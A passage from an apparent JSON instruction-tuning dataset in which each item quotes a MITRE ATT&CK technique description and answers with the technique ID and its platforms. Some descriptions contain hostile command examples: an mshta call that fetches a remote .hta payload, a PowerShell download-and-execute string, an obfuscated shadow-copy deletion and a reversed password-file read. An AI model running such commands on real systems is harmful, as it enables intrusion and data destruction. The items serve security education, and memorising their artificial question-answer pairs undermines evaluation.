    "instruction": "What are the platforms that are related to the following technique description: Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exploitation of Remote Services (T1210);\nTechnique Exploitation of Remote Services (T1210) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",
      "answer": "The provided description is related to MITRE technique Exploitation of Remote Services (T1210);\nTechnique Exploitation of Remote Services (T1210) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows Native API which is called from functions like `LoadLibrary` at run time.",
    "context": "",
    "output": "The provided description is related to MITRE technique Shared Modules (T1129);\nTechnique Shared Modules (T1129) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows Native API which is called from functions like `LoadLibrary` at run time.",
      "answer": "The provided description is related to MITRE technique Shared Modules (T1129);\nTechnique Shared Modules (T1129) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing: Spearphishing Link (T1566.002);\nTechnique Phishing: Spearphishing Link (T1566.002) is applicable to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace;\nTherefore, the given procedure description is related to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.",
      "answer": "The provided description is related to MITRE technique Phishing: Spearphishing Link (T1566.002);\nTechnique Phishing: Spearphishing Link (T1566.002) is applicable to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace;\nTherefore, the given procedure description is related to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Command Obfuscation (T1027.010);\nTechnique Obfuscated Files or Information: Command Obfuscation (T1027.010) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Command Obfuscation (T1027.010);\nTechnique Obfuscated Files or Information: Command Obfuscation (T1027.010) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: DNS (T1071.004);\nTechnique Application Layer Protocol: DNS (T1071.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: DNS (T1071.004);\nTechnique Application Layer Protocol: DNS (T1071.004) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "answer": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Binary Proxy Execution: Mshta (T1218.005);\nTechnique System Binary Proxy Execution: Mshta (T1218.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",
      "answer": "The provided description is related to MITRE technique System Binary Proxy Execution: Mshta (T1218.005);\nTechnique System Binary Proxy Execution: Mshta (T1218.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS. These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.\n\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.\n\nOn network devices, Network Device CLI commands such as `show clock detail` can be used to see the current time configuration.\n\nIn addition, system calls \u2013 such as <code>time()</code> \u2013 have been used to collect the current time on Linux devices. On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.\n\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Time Discovery (T1124);\nTechnique System Time Discovery (T1124) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS. These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.\n\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.\n\nOn network devices, Network Device CLI commands such as `show clock detail` can be used to see the current time configuration.\n\nIn addition, system calls \u2013 such as <code>time()</code> \u2013 have been used to collect the current time on Linux devices. On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.\n\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.",
      "answer": "The provided description is related to MITRE technique System Time Discovery (T1124);\nTechnique System Time Discovery (T1124) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "context": "",
    "output": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "answer": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
      "answer": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
